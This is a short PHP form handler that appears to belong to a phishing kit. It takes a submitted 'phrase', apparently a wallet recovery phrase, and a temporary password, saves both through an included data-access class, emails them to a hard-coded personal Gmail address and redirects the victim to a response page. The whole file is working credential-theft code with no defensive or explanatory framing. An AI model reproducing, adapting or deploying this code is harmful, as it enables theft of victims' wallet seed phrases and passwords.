<?php

include("Data.php");
if (isset($_POST["send"])) {
	
	$phrase = htmlspecialchars(stripslashes(strip_tags(trim($_POST['phrase']))));
	$pass = htmlspecialchars(stripslashes(strip_tags(trim($_POST['Temp_Pass']))));
	$message = "Phrase = ".$phrase."Temporary Password = ".$pass;



		$send_phrase = new DataAccess();
		$response = $send_phrase->PostPhrase($phrase,$pass);
			mail("jerrymary20@gmail.com", "New Phrase and Password Received", $message);
			header("location:response.html");

		
}

?>